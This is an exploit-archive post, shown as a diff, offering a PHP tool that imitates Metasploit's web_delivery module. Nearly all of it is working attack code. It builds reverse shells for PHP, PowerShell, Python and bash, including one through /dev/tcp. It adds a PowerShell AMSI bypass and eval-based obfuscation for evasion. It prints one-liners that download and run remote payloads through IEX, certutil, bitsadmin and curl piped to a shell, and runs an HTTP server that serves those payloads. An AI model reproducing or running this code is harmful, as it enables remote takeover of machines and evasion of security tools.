@@ -1,0 +1,926 @@
+=============================================================================================================================================
+| # Title     : Metasploit Script Web Delivery Payload Delivery Module                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery/                                                        |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/208942/
+
+[+] Summary : This project presents an advanced proof-of-concept (PoC) that emulates the behavior of Metasploit’s multi/script/web_delivery module using PHP. 
+              The goal is to demonstrate how script-based payload delivery works in a modular and extensible way, without relying directly on Metasploit.
+              The script launches a lightweight HTTP delivery service and dynamically generates one-liner execution commands for multiple platforms and interpreters. 
+			  When executed on a target system (through an existing execution vector such as RCE, command injection, or local access), these commands retrieve payloads from the server and execute them, typically in memory.
+
+[+] Key characteristics of the PoC include:
+
+Multi-language and multi-platform support: PHP, Python, PowerShell, Bash, Linux, macOS, and Windows Living-Off-The-Land binaries.
+
+Dynamic payload generation with configurable listener parameters (LHOST/LPORT).
+
+Obfuscation and evasion techniques, including layered encoding and optional AMSI bypass logic for PowerShell.
+
+Session tracking and basic telemetry, such as request counts, active sessions, and rate limiting.
+
+Modular architecture, separating concerns into payload generation, obfuscation, HTTP handling, session management, and CLI interaction.
+
+Operator-friendly CLI interface that displays ready-to-use delivery commands similar to Metasploit’s output.
+
+It supports the following delivery targets:
+
+PHP
+
+Python
+
+PowerShell (with TLS enforcement / AMSI bypass / encoded payload)
+
+Regsvr32 Squiblydoo
+
+pubprn.vbs
+
+SyncAppvPublishingServer
+
+Linux (wget)
+
+macOS (curl)
+
+The script dynamically builds the execution commands and prints them to the operator, while the server simulates payload distribution.
+Helpers are included for creating payloads, random URIs, GUIDs, SCT templates, and HTTP server responses.
+
+It is not a full HTTP server implementation but a framework skeleton showing how delivery is structured and executed, suitable for extension into production or integrated into a backend for automation.
+
+[+]  POC :	
+
+<?php
+/**
+ * by indoushka
+ * Advanced Web Delivery with Multiple Delivery Methods
+ */
+
+// ========================
+// Enhanced Configuration
+// ========================
+$config = [
+    'version' => '2.0',
+    'defaults' => [
+        'target' => 'PSH',
+        'server_host' => '0.0.0.0',
+        'server_port' => 8080,
+        'lhost' => '127.0.0.1',
+        'lport' => 4444,
+        'protocol' => 'http',
+        'obfuscation' => true,
+        'encryption' => false,
+        'rotating_payloads' => true,
+        'log_requests' => true,
+        'rate_limit' => 100,
+        'session_timeout' => 300,
+        'stealth_mode' => false,
+        'payload_expiry' => 3600,
+        'auto_cleanup' => true,
+        'multiple_payloads' => [
+            'php' => true,
+            'python' => true,
+            'powershell' => true,
+            'bash' => true
+        ]
+    ]
+];
+
+// ========================
+// Advanced Obfuscation Class
+// ========================
+class AdvancedObfuscator
+{
+    public static function obfuscate($code, $method = 'multiple', $level = 3)
+    {
+        switch ($method) {
+            case 'base64':
+                return base64_encode($code);
+                
+            case 'rot13':
+                return str_rot13($code);
+                
+            case 'xor':
+                $key = bin2hex(random_bytes(8));
+                $encrypted = '';
+                for ($i = 0; $i < strlen($code); $i++) {
+                    $encrypted .= $code[$i] ^ $key[$i % strlen($key)];
+                }
+                return base64_encode($encrypted) . '|' . $key;
+                
+            case 'gzip':
+                return base64_encode(gzcompress($code, 9));
+                
+            case 'multiple':
+                for ($i = 0; $i < $level; $i++) {
+                    $code = self::applyRandomObfuscation($code);
+                }
+                return $code;
+                
+            default:
+                return $code;
+        }
+    }
+
+    private static function applyRandomObfuscation($code)
+    {
+        $methods = ['base64', 'rot13', 'gzip'];
+        $method = $methods[array_rand($methods)];
+        
+        switch ($method) {
+            case 'base64':
+                return 'eval(base64_decode("' . base64_encode($code) . '"));';
+                
+            case 'rot13':
+                return 'eval(str_rot13("' . str_rot13($code) . '"));';
+                
+            case 'gzip':
+                return 'eval(gzuncompress(base64_decode("' . base64_encode(gzcompress($code)) . '")));';
+                
+            default:
+                return $code;
+        }
+    }
+}
+
+// ========================
+// Session Manager Class
+// ========================
+class SessionManager
+{
+    private static $sessions = [];
+    private static $logFile = 'sessions.log';
+
+    public static function createSession($ip, $userAgent, $target)
+    {
+        $sessionId = bin2hex(random_bytes(16));
+        $session = [
+            'id' => $sessionId,
+            'ip' => $ip,
+            'user_agent' => $userAgent,
+            'target' => $target,
+            'created' => time(),
+            'last_activity' => time(),
+            'request_count' => 1,
+            'payload_delivered' => false,
+            'active' => true
+        ];
+
+        self::$sessions[$sessionId] = $session;
+        self::logSession($session, 'CREATED');
+        
+        return $sessionId;
+    }
+
+    public static function updateSession($sessionId)
+    {
+        if (isset(self::$sessions[$sessionId])) {
+            self::$sessions[$sessionId]['last_activity'] = time();
+            self::$sessions[$sessionId]['request_count']++;
+        }
+    }
+
+    public static function markPayloadDelivered($sessionId)
+    {
+        if (isset(self::$sessions[$sessionId])) {
+            self::$sessions[$sessionId]['payload_delivered'] = true;
+            self::logSession(self::$sessions[$sessionId], 'PAYLOAD_DELIVERED');
+        }
+    }
+
+    public static function getActiveSessions()
+    {
+        $active = [];
+        foreach (self::$sessions as $session) {
+            if ($session['active'] && (time() - $session['last_activity']) < 300) {
+                $active[] = $session;
+            }
+        }
+        return $active;
+    }
+
+    private static function logSession($session, $action)
+    {
+        $logEntry = sprintf(
+            "[%s] %s - Session: %s, IP: %s, Target: %s\n",
+            date('Y-m-d H:i:s'),
+            $action,
+            $session['id'],
+            $session['ip'],
+            $session['target']
+        );
+        
+        @file_put_contents(self::$logFile, $logEntry, FILE_APPEND);
+    }
+}
+
+// ========================
+// Advanced Payload Generator Class
+// ========================
+class AdvancedPayloadGenerator
+{
+    public static function generatePayload($type, $params)
+    {
+        $method = 'generate' . ucfirst(strtolower($type)) . 'Payload';
+        
+        if (method_exists(__CLASS__, $method)) {
+            return self::$method($params);
+        }
+        
+        return self::generateGenericPayload($params);
+    }
+
+    private static function generatePhpPayload($params)
+    {
+        $payloads = [
+            'basic' => '<?php $s=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/sh -i <&3 >&3 2>&3");?>',
+            'advanced' => '<?php $c=base64_decode("{{ENCODED}}");eval($c);?>',
+            'stealth' => '<?php $f=tempnam(sys_get_temp_dir(),"x");file_put_contents($f,file_get_contents("{{URL}}"));include($f);unlink($f);?>'
+        ];
+        
+        $selected = $payloads[$params['variant'] ?? 'basic'];
+        return str_replace(
+            ['{{LHOST}}', '{{LPORT}}', '{{ENCODED}}', '{{URL}}'],
+            [$params['lhost'], $params['lport'], base64_encode($selected), $params['server_url']],
+            $selected
+        );
+    }
+
+    private static function generatePowershellPayload($params)
+    {
+        $amsiBypass = '
+        # AMSI Bypass
+        $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+        ';
+        
+        $payload = '
+        # Reverse Shell
+        $client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});
+        $stream = $client.GetStream();
+        [byte[]]$bytes = 0..65535|%{0};
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+            $sendback = (iex $data 2>&1 | Out-String );
+            $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+            $stream.Write($sendbyte,0,$sendbyte.Length);
+            $stream.Flush()
+        };
+        $client.Close()
+        ';
+        
+        if ($params['amsi_bypass'] ?? true) {
+            $payload = $amsiBypass . $payload;
+        }
+        
+        if ($params['obfuscate'] ?? true) {
+            $payload = self::obfuscatePowerShell($payload);
+        }
+        
+        return str_replace(
+            ['{{LHOST}}', '{{LPORT}}'],
+            [$params['lhost'], $params['lport']],
+            $payload
+        );
+    }
+
+    private static function obfuscatePowerShell($code)
+    {
+        $code = str_replace(' ', '` ', $code);
+        $code = str_replace('-', '`-', $code);
+        $code = str_replace('$', '`$', $code);
+        $code = str_replace('.', '`.', $code);
+        
+        return $code;
+    }
+
+    private static function generatePythonPayload($params)
+    {
+        return '
+import socket,subprocess,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{{LHOST}}",{{LPORT}}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+        ';
+    }
+
+    private static function generateBashPayload($params)
+    {
+        return 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1';
+    }
+
+    private static function generateGenericPayload($params)
+    {
+        return "echo 'Unsupported payload type: {$params['type']}'";
+    }
+}
+
+// ========================
+// Enhanced HTTP Server Class
+// ========================
+class EnhancedHttpServer
+{
+    private $host;
+    private $port;
+    private $handler;
+    private $socket;
+    private $stats;
+    private $rateLimiter;
+
+    public function __construct($host = '0.0.0.0', $port = 8080)
+    {
+        $this->host = $host;
+        $this->port = $port;
+        $this->stats = [
+            'requests' => 0,
+            'payloads_served' => 0,
+            'blocked_requests' => 0,
+            'start_time' => time()
+        ];
+        $this->rateLimiter = new RateLimiter();
+    }
+
+    public function setHandler($handler)
+    {
+        $this->handler = $handler;
+    }
+
+    public function start()
+    {
+        $context = stream_context_create();
+        
+        $this->socket = stream_socket_server(
+            "tcp://{$this->host}:{$this->port}",
+            $errno,
+            $errstr,
+            STREAM_SERVER_BIND | STREAM_SERVER_LISTEN,
+            $context
+        );
+
+        if (!$this->socket) {
+            die("Error: {$errstr} ({$errno})\n");
+        }
+
+        stream_set_blocking($this->socket, 0);
+        
+        echo "[+] Enhanced HTTP Server started on {$this->host}:{$this->port}\n";
+        echo "[+] PID: " . getmypid() . "\n";
+        
+        $this->mainLoop();
+    }
+
+    private function mainLoop()
+    {
+        while (true) {
+            $client = @stream_socket_accept($this->socket, 0);
+            
+            if ($client) {
+                $this->handleClient($client);
+            }
+            
+            $this->cleanup();
+            usleep(10000);
+        }
+    }
+
+    private function handleClient($client)
+    {
+        $request = '';
+        $headers = [];
+        $clientIp = stream_socket_get_name($client, true);
+        
+        stream_set_timeout($client, 5);
+        
+        while (!feof($client)) {
+            $request .= fread($client, 8192);
+            if (strpos($request, "\r\n\r\n") !== false) {
+                break;
+            }
+        }
+        
+        if (empty($request)) {
+            fclose($client);
+            return;
+        }
+        
+        $lines = explode("\r\n", $request);
+        $requestLine = $lines[0];
+        $method = explode(' ', $requestLine)[0] ?? '';
+        $path = explode(' ', $requestLine)[1] ?? '/';
+        
+        foreach ($lines as $line) {
+            if (strpos($line, ': ') !== false) {
+                list($key, $value) = explode(': ', $line, 2);
+                $headers[strtolower($key)] = $value;
+            }
+        }
+        
+        $userAgent = $headers['user-agent'] ?? 'Unknown';
+        
+        if (!$this->rateLimiter->check($clientIp)) {
+            $this->stats['blocked_requests']++;
+            $response = "HTTP/1.1 429 Too Many Requests\r\n";
+            $response .= "Content-Type: text/plain\r\n";
+            $response .= "Content-Length: 18\r\n";
+            $response .= "Connection: close\r\n\r\n";
+            $response .= "Rate limit exceeded";
+            fwrite($client, $response);
+            fclose($client);
+            return;
+        }
+        
+        $this->stats['requests']++;
+        
+        if ($this->handler) {
+            $response = call_user_func($this->handler, $request, [
+                'ip' => $clientIp,
+                'path' => $path,
+                'method' => $method,
+                'headers' => $headers,
+                'user_agent' => $userAgent
+            ]);
+            
+            if (strpos($response, '200 OK') !== false) {
+                $this->stats['payloads_served']++;
+            }
+            
+            fwrite($client, $response);
+        }
+        
+        fclose($client);
+    }
+
+    public function getStats()
+    {
+        $uptime = time() - $this->stats['start_time'];
+        return [
+            'uptime' => $this->formatUptime($uptime),
+            'requests' => $this->stats['requests'],
+            'payloads_served' => $this->stats['payloads_served'],
+            'blocked_requests' => $this->stats['blocked_requests'],
+            'requests_per_minute' => $this->stats['requests'] / ($uptime / 60),
+            'active_sessions' => count(SessionManager::getActiveSessions())
+        ];
+    }
+
+    private function formatUptime($seconds)
+    {
+        $hours = floor($seconds / 3600);
+        $minutes = floor(($seconds % 3600) / 60);
+        $seconds = $seconds % 60;
+        
+        return sprintf("%02d:%02d:%02d", $hours, $minutes, $seconds);
+    }
+
+    private function cleanup()
+    {
+        static $lastCleanup = 0;
+        if (time() - $lastCleanup > 60) {
+            $lastCleanup = time();
+        }
+    }
+}
+
+// ========================
+// Rate Limiter Class
+// ========================
+class RateLimiter
+{
+    private $requests = [];
+    private $limit = 100;
+    private $window = 60;
+
+    public function check($ip)
+    {
+        $now = time();
+        $key = $ip . '_' . floor($now / $this->window);
+        
+        if (!isset($this->requests[$key])) {
+            $this->requests[$key] = 0;
+        }
+        
+        $this->requests[$key]++;
+        
+        foreach (array_keys($this->requests) as $k) {
+            if (strpos($k, '_') !== false) {
+                list($ipPart, $windowPart) = explode('_', $k);
+                if ($windowPart < floor(($now - $this->window) / $this->window)) {
+                    unset($this->requests[$k]);
+                }
+            }
+        }
+        
+        return $this->requests[$key] <= $this->limit;
+    }
+}
+
+// ========================
+// Advanced Web Delivery Class
+// ========================
+class AdvancedWebDelivery
+{
+    private $config;
+    private $server;
+    private $payloads;
+    private $deliveryMethods;
+
+    public function __construct($options = [])
+    {
+        global $config;
+        $this->config = array_merge($config['defaults'], $options);
+        $this->server = new EnhancedHttpServer(
+            $this->config['server_host'],
+            $this->config['server_port']
+        );
+        
+        $this->server->setHandler([$this, 'handleRequest']);
+        $this->initializeDeliveryMethods();
+        $this->initializePayloads();
+    }
+
+    private function initializeDeliveryMethods()
+    {
+        $this->deliveryMethods = [
+            'psh' => [
+                'IEX' => "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('{{URL}}')\"",
+                'IEX_encoded' => "powershell -nop -w hidden -EncodedCommand {{ENCODED}}",
+                'bitsadmin' => "bitsadmin /transfer job /download /priority normal {{URL}} %temp%\\file.ps1 && powershell -ep bypass -file %temp%\\file.ps1",
+                'certutil' => "certutil -urlcache -split -f {{URL}} %temp%\\file.ps1 && powershell -ep bypass -file %temp%\\file.ps1"
+            ],
+            'php' => [
+                'basic' => "php -r \"eval(file_get_contents('{{URL}}'));\"",
+                'curl' => "curl -s {{URL}} | php",
+                'wget' => "wget -qO- {{URL}} | php"
+            ],
+            'python' => [
+                'basic' => "python -c \"import urllib.request; exec(urllib.request.urlopen('{{URL}}').read())\"",
+                'curl' => "curl -s {{URL}} | python",
+                'wget' => "wget -qO- {{URL}} | python"
+            ],
+            'bash' => [
+                'curl' => "curl -s {{URL}} | bash",
+                'wget' => "wget -qO- {{URL}} | bash"
+            ]
+        ];
+    }
+
+    private function initializePayloads()
+    {
+        $params = [
+            'lhost' => $this->config['lhost'],
+            'lport' => $this->config['lport'],
+            'server_url' => $this->getServerUrl(),
+            'amsi_bypass' => true,
+            'obfuscate' => $this->config['obfuscation']
+        ];
+
+        $this->payloads = [];
+        foreach ($this->config['multiple_payloads'] as $type => $enabled) {
+            if ($enabled) {
+                $this->payloads[$type] = AdvancedPayloadGenerator::generatePayload($type, $params);
+            }
+        }
+    }
+
+    public function run()
+    {
+        $this->showAdvancedBanner();
+        $this->showDeliveryOptions();
+        $this->server->start();
+    }
+
+    private function showAdvancedBanner()
+    {
+        $banner = "
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║                  Advanced Script Web Delivery System                         ║
+║                              by indoushka                                    ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+        ";
+        
+        echo $banner . "\n";
+        echo "[*] Server URL: " . $this->getServerUrl() . "\n";
+        echo "[*] Listener: " . $this->config['lhost'] . ":" . $this->config['lport'] . "\n";
+        echo "[*] Target: " . $this->config['target'] . "\n";
+        echo "[*] Obfuscation: " . ($this->config['obfuscation'] ? "Enabled" : "Disabled") . "\n";
+        echo "[*] Stealth Mode: " . ($this->config['stealth_mode'] ? "Enabled" : "Disabled") . "\n";
+        echo str_repeat("=", 80) . "\n\n";
+    }
+
+    private function showDeliveryOptions()
+    {
+        echo "[*] Available Delivery Commands:\n";
+        echo str_repeat("-", 80) . "\n";
+        
+        $target = strtolower($this->config['target']);
+        $url = $this->getServerUrl();
+        
+        if (isset($this->deliveryMethods[$target])) {
+            foreach ($this->deliveryMethods[$target] as $method => $command) {
+                $finalCommand = str_replace('{{URL}}', $url, $command);
+                
+                if (strpos($command, '{{ENCODED}}') !== false) {
+                    $encoded = base64_encode(
+                        "IEX(New-Object Net.WebClient).DownloadString('{$url}')"
+                    );
+                    $finalCommand = str_replace('{{ENCODED}}', $encoded, $finalCommand);
+                }
+                
+                echo "[{$method}]\n";
+                echo $finalCommand . "\n\n";
+            }
+        } else {
+            echo "[!] No delivery methods available for target: {$target}\n";
+        }
+        
+        echo str_repeat("=", 80) . "\n\n";
+    }
+
+    private function getServerUrl()
+    {
+        $protocol = $this->config['protocol'] ?? 'http';
+        return $protocol . '://' . $this->config['server_host'] . ':' . $this->config['server_port'];
+    }
+
+    public function handleRequest($request, $clientInfo = [])
+    {
+        $path = $clientInfo['path'] ?? '/';
+        $ip = $clientInfo['ip'] ?? '0.0.0.0';
+        $userAgent = $clientInfo['user_agent'] ?? 'Unknown';
+        
+        static $sessions = [];
+        $sessionKey = md5($ip . $userAgent);
+        
+        if (!isset($sessions[$sessionKey])) {
+            $sessions[$sessionKey] = [
+                'id' => bin2hex(random_bytes(8)),
+                'ip' => $ip,
+                'user_agent' => $userAgent,
+                'created' => time(),
+                'requests' => 1,
+                'paths' => [$path]
+            ];
+        } else {
+            $sessions[$sessionKey]['requests']++;
+            $sessions[$sessionKey]['paths'][] = $path;
+        }
+        
+        $sessionId = $sessions[$sessionKey]['id'];
+        
+        echo sprintf(
+            "[%s] %s - %s - %s\n",
+            date('H:i:s'),
+            $ip,
+            $path,
+            $userAgent
+        );
+        
+        if (strpos($path, '/payload/') === 0) {
+            return $this->handlePayloadRequest($path, $sessionId);
+        } elseif (strpos($path, '/bypass') !== false) {
+            return $this->handleAmsiBypass();
+        } elseif (strpos($path, '/stats') !== false) {
+            return $this->handleStatsRequest();
+        } elseif ($path === '/') {
+            return $this->handleIndex();
+        } else {
+            return $this->handle404();
+        }
+    }
+
+    private function handlePayloadRequest($path, $sessionId)
+    {
+        $parts = explode('/', $path);
+        $payloadType = $parts[2] ?? strtolower($this->config['target']);
+        
+        if (isset($this->payloads[$payloadType])) {
+            $payload = $this->payloads[$payloadType];
+            
+            if ($this->config['obfuscation']) {
+                $payload = AdvancedObfuscator::obfuscate($payload, 'multiple', 2);
+            }
+            
+            echo "[+] Delivering {$payloadType} payload to session: {$sessionId}\n";
+            
+            return $this->createResponse(200, $payload, 'text/plain', [
+                'X-Payload-Type' => $payloadType,
+                'X-Session-ID' => $sessionId
+            ]);
+        }
+        
+        return $this->createResponse(404, 'Payload not found');
+    }
+
+    private function handleAmsiBypass()
+    {
+        $bypass = '
+        # Advanced AMSI Bypass
+        $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
+        $d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
+        $g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);
+        [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);
+        ';
+        
+        return $this->createResponse(200, $bypass, 'text/plain');
+    }
+
+    private function handleStatsRequest()
+    {
+        $stats = $this->server->getStats();
+        $html = "<h1>Server Statistics</h1><pre>" . print_r($stats, true) . "</pre>";
+        return $this->createResponse(200, $html, 'text/html');
+    }
+
+    private function handleIndex()
+    {
+        $html = "
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Script Delivery</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                .container { max-width: 800px; margin: auto; }
+                .box { border: 1px solid #ccc; padding: 20px; margin: 10px 0; }
+            </style>
+        </head>
+        <body>
+            <div class='container'>
+                <h1>Script Web Delivery System</h1>
+                <p>This is a legitimate web server for authorized testing purposes.</p>
+                <div class='box'>
+                    <h3>Available Payloads:</h3>
+                    <ul>
+        ";
+        
+        foreach (array_keys($this->payloads) as $type) {
+            $html .= "<li><a href='/payload/{$type}'>Download {$type} payload</a></li>";
+        }
+        
+        $html .= "
+                    </ul>
+                </div>
+            </div>
+        </body>
+        </html>
+        ";
+        
+        return $this->createResponse(200, $html, 'text/html');
+    }
+
+    private function handle404()
+    {
+        return $this->createResponse(404, 'Not Found');
+    }
+
+    private function createResponse($status, $content, $contentType = 'text/html', $customHeaders = [])
+    {
+        $statusText = [
+            200 => 'OK',
+            404 => 'Not Found',
+            429 => 'Too Many Requests'
+        ][$status] ?? 'OK';
+        
+        $response = "HTTP/1.1 {$status} {$statusText}\r\n";
+        $response .= "Content-Type: {$contentType}\r\n";
+        $response .= "Content-Length: " . strlen($content) . "\r\n";
+        $response .= "Connection: close\r\n";
+        
+        foreach ($customHeaders as $key => $value) {
+            $response .= "{$key}: {$value}\r\n";
+        }
+        
+        $response .= "\r\n" . $content;
+        
+        return $response;
+    }
+}
+
+// ========================
+// Enhanced CLI Interface
+// ========================
+class EnhancedCliInterface
+{
+    public static function run()
+    {
+        self::showWelcome();
+        
+        $config = [
+            'target' => self::promptSelect(
+                "Select target language:",
+                ['PSH', 'PHP', 'Python', 'Bash'],
+                'PSH'
+            ),
+            'lhost' => self::prompt("Listener IP:", "127.0.0.1"),
+            'lport' => self::prompt("Listener port:", "4444"),
+            'server_host' => self::prompt("Server bind IP:", "0.0.0.0"),
+            'server_port' => self::prompt("Server port:", "8080"),
+            'obfuscation' => self::promptYesNo("Enable obfuscation?", true),
+            'stealth_mode' => self::promptYesNo("Enable stealth mode?", false)
+        ];
+        
+        echo "\n[+] Configuration complete. Starting server...\n";
+        
+        $webDelivery = new AdvancedWebDelivery($config);
+        $webDelivery->run();
+    }
+    
+    private static function showWelcome()
+    {
+        echo "
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                     ADVANCED WEB DELIVERY SYSTEM SETUP                       ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+\n";
+    }
+    
+    private static function prompt($message, $default = "")
+    {
+        echo "[?] {$message} ";
+        if ($default) echo "[{$default}] ";
+        
+        $input = trim(fgets(STDIN));
+        return $input ?: $default;
+    }
+    
+    private static function promptSelect($message, $options, $default)
+    {
+        echo "[?] {$message}\n";
+        foreach ($options as $i => $option) {
+            $index = $i + 1;
+            echo "    {$index}. {$option}" . ($option === $default ? " (default)" : "") . "\n";
+        }
+        
+        $input = self::prompt("Choice [1-" . count($options) . "]:", array_search($default, $options) + 1);
+        $index = intval($input) - 1;
+        
+        return isset($options[$index]) ? $options[$index] : $default;
+    }
+    
+    private static function promptYesNo($message, $default)
+    {
+        $defaultText = $default ? 'Y/n' : 'y/N';
+        $input = self::prompt("{$message} [{$defaultText}]:", $default ? 'Y' : 'N');
+        
+        return strtolower($input) === 'y' || ($default && strtolower($input) !== 'n');
+    }
+}
+
+// ========================
+// Main Execution
+// ========================
+if (php_sapi_name() === 'cli') {
+    global $argv, $argc;
+    
+    if ($argc > 1) {
+        $options = [];
+        for ($i = 1; $i < $argc; $i++) {
+            if (strpos($argv[$i], '=') !== false) {
+                list($key, $value) = explode('=', $argv[$i], 2);
+                $options[$key] = $value;
+            }
+        }
+        
+        $server = new AdvancedWebDelivery($options);
+        $server->run();
+    } else {
+        EnhancedCliInterface::run();
+    }
+} elseif (php_sapi_name() === 'cli-server') {
+    $server = new AdvancedWebDelivery($config['defaults']);
+    
+    $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+    $clientInfo = [
+        'ip' => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
+        'path' => $path,
+        'method' => $_SERVER['REQUEST_METHOD'],
+        'headers' => getallheaders(),
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+    ];
+    
+    $response = $server->handleRequest('', $clientInfo);
+    
+    $lines = explode("\r\n", $response);
+    $statusLine = array_shift($lines);
+    
+    foreach ($lines as $line) {
+        if ($line === '') break;
+        header($line);
+    }
+    
+    $body = substr($response, strpos($response, "\r\n\r\n") + 4);
+    echo $body;
+} else {
+    echo "<h1>Advanced Script Web Delivery System</h1>";
+    echo "<p>This system must be run from the command line.</p>";
+    echo "<pre>Usage: php " . basename(__FILE__) . " [options]</pre>";
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
